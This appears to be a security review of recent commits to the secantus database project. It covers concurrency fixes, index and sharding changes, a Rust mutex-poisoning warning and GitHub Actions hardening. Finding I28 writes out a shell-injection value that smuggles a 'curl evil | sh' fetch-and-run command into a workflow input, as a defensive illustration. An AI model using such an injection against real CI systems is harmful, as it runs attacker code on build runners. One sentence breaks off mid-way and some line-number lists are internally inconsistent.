## What's new since the last review

Eleven commits landed since 2026-07-21's `69df85f4` cutoff. Each was read in
full; three touch security-relevant surface, the rest are CI/test/docs only:

- **`a984894b` — bound the admin change-stream websocket receive and close
  the "open" frame / `watch()` race.** Two bugs: starlette's `TestClient`
  websocket receive has no timeout (a test-harness hang, not a wire-facing
  defect), and — the substantive one — `src/secantus/admin/routers/
  changestream.py` used to send the `{"type": "open"}` frame *before* calling
  `target.watch()`, so a write landing in that window was silently lost. The
  fix reorders `watch()` before the "open" send. This is a correctness/
  reliability fix on an already auth-gated, loopback-model admin surface —
  reviewed for security implications and found sound: no new attack surface,
  `verify_websocket_token` gating is untouched, and the reordering only
  changes *when* the promise "you'll see writes from here" starts being true,
  not who can open the socket.
- **`0932ce4f` — `create_index` now refreshes its read snapshot before
  scanning.** A concurrency/data-integrity bug (a WT MVCC snapshot pinned on
  the index-build thread could hide docs committed by other threads, so the
  new index silently under-reports them forever) — exactly the class of bug
  `CLAUDE.md`'s "never ignore an error" section cares about, but not a
  security vulnerability: no untrusted input drives the missing refresh, and
  the fix is strictly additive (a fresher snapshot can only see more
  committed rows, never fewer or different ones). Reviewed, sound, no
  security implication.
- **`34728cf3` — multikey index keys for dotted paths into arrays** (317
  lines in `storage.py`, a new `get_path_values`/`get_path_values` pair in
  both `paths.py` and `crates/secantus-core/src/paths.rs`, plus the
  `isMultiKey` explain/listIndexes wiring in both servers). A substantial
  correctness fix — index-key generation now walks *through* arrays the way
  mongod's does — reviewed specifically for the injection/DoS angles this
  size of storage-layer change warrants:
  - `get_path_values` (both langs) is bounded by `path.split(".")` — linear
    in the number of dots in the caller-supplied index key spec / query
    field, not recursive, and its inner loop is bounded by the document's own
    array lengths (themselves capped by `MAX_BSON_OBJECT_SIZE`). No
    unbounded-recursion or memory-blowup vector introduced.
  - The Rust side introduces zero new `unsafe` blocks and zero new
    `.unwrap()`/`panic!`/`.expect()` calls (verified: `git show 34728cf3 --
    crates/ | grep -nE "unsafe|\.unwrap\(\)|panic!|\.expect\("` matches only
    the commit message's own use of the word "unsafe", describing a fixed
    *test* fixture).
  - `listIndexes` / the admin index-badge template on both servers now
    explicitly *strip* the internal `multikey` catalog flag before it reaches
    the wire (mirrors mongod's own behaviour, probed against 6.0.16) — a
    correct information-parity decision, not a leak.
  - No path/URI injection: `_doc_table_for` (below) and the index-entry
    tables are still keyed by `(db, coll)` as WT *key columns*, never
    interpolated into a table/URI string.
- **`596cc9f1` — shard the documents table into 16 per-collection WT tables,
  routed by an FNV-1a hash of `(db, coll)`.** This is exactly the pattern
  `CLAUDE.md` and this review's §4 warn about ("confirm `(db, coll)` names
  are stored as data, never formatted into a create/drop URI") landing in a
  performance commit, so it got a close read. The routing function
  (`_doc_shard_name(s) -> f"table:secantus_documents_sh{s}"`) only ever
  formats an **integer shard index** (`hash(db, coll) % 16`, `0..15`) into
  the table-name string — `db`/`coll` themselves never reach the URI, only
  the WT key columns as before. The shard count is a fixed compile-time
  constant, not attacker-influenceable. Sound; no new injection surface.

The remaining seven commits (`98d72d92`, `fd7367c6`, `940616a8`, `1fb2e9c4`,
`cd26b439`, `329c07c8`, `9be306f6`) are CI-harness / docs-only changes to the

## 🟠 WARNING (Address within 1 week)

### W1 (carried forward, still open) — Two non-poison-tolerant `.lock().unwrap()` sites remain on the Rust oplog mutex

**Files:** `crates/secantus-storage/src/lib.rs:2816` and `:2895`, inside
`prune_oplog_inner` (line numbers shifted from the 2026-07-21 report's
`:2657`/`:2736` because `34728cf3`'s multikey work inserted ~130 lines
earlier in the file — same two call sites, re-verified present by direct
read of the current function body).

This is unchanged from yesterday's W1 and is **already tracked as open
issue [#593](../../../../issues/593)** ("Rust oplog mutex: two
non-poison-tolerant lock sites reintroduced same-day as the prior fix"),
filed 2026-07-21. No new issue filed for it today — see that issue for the
full failure-scenario writeup (a panic anywhere while this mutex is held
poisons it permanently, wedging oplog emission and change streams
server-wide until restart). Every other `self.oplog.lock()` call site in the
file (11 total, `lib.rs:1913, 2170, 2231, 2265, 2280, 2300, 2311, 2767,
4804`, plus the two new ones added by `596cc9f1`'s doc-sharding work at
`1913`/`4804` — both already correctly poison-tolerant) uses the
`unwrap_or_else(|e| e.into_inner())` pattern; these two remain the sole
holdouts.

**Recommendation:** unchanged from #593 — convert both sites to
`self.oplog.lock().unwrap_or_else(|e| e.into_inner())`. Two-line fix, no
behaviour change on the non-panicking path. Given this has now survived a
full day and a second review cycle untouched, and a second reviewer
(`b8b05630`'s `cargo-audit.yml`) already exists in CI for dependency
advisories, this is also a good candidate for a cheap grep-based CI
assertion (`! grep -rn '\.lock()\.unwrap()' crates/secantus-storage
crates/secantus-commands` outside `#[cfg(test)]`) so the class of bug can't
silently reappear a third time.

## 🟡 INFO (Best-practice recommendations)

### New this cycle

- **I27 — `crash-repro.yml` (new workflow, `a984894b`'s investigation
  tooling landed the prior day but not reviewed until now) uses moving-tag
  actions, inconsistent with the rest of the now fully-SHA-pinned workflow
  fleet.** `actions/checkout@v4`, `astral-sh/setup-uv@v5`, and
  `actions/upload-artifact@v4` are all tag refs; every other workflow file in
  `.github/workflows/` pins the same three actions (and everything else) to a
  40-character commit SHA with a trailing version comment (confirmed by
  `grep -n "uses:" .github/workflows/*.yml | sort -u` — `crash-repro.yml` is
  the only file with unpinned `uses:` lines). Severity is low: the workflow
  is `workflow_dispatch`-only (never runs on push/PR), declares
  `permissions: { contents: read }` only, and touches no secrets — a
  compromised action here can at most run code in a throwaway runner with a
  read-only default token, not exfiltrate anything or write to the repo. Still
  worth pinning for consistency with the repo's own established bar (issue
  #117's original finding, closed 2026-07-01, was exactly this pattern on
  higher-privilege workflows).
- **I28 — `crash-repro.yml` interpolates several `workflow_dispatch` inputs
  directly into `run:` bash blocks** (`${{ inputs.python_version }}` in `uv
  python install ${{ inputs.python_version }}`; `${{ inputs.attempts }}`,
  `${{ inputs.cpu_burners }}`, `${{ inputs.memory_max }}`, `${{ inputs.mode
  }}`, `${{ inputs.durable }}`, `${{ inputs.timeout_seconds }}`, `${{
  inputs.timeout_method }}` assigned into shell variables via direct
  expansion rather than through an `env:` block referenced as `$VAR`) — the
  literal pattern this review's own §12b asks to search for, just sourced
  from `inputs.*` rather than `github.event.*`. A value like `python_version
  = 3.10"; curl evil | sh #` would execute arbitrary shell in the runner.
  Practical severity is low because triggering `workflow_dispatch` already
  requires write access to the repository — an attacker with that level of
  access could achieve the same outcome by editing the workflow file
  directly — but it's a real instance of the anti-pattern and a one-line-per-
  input fix (move each `inputs.X` into the step's `env:` block, reference as
  `$X` in the script). The same workflow's `cache-suffix:
  crash-repro-${{ inputs.python_version }}` on the `astral-sh/setup-uv` step
  is the same category (a cache key partially keyed on unsanitized
  free-text input), lower stakes still (affects only build-cache hit rate).
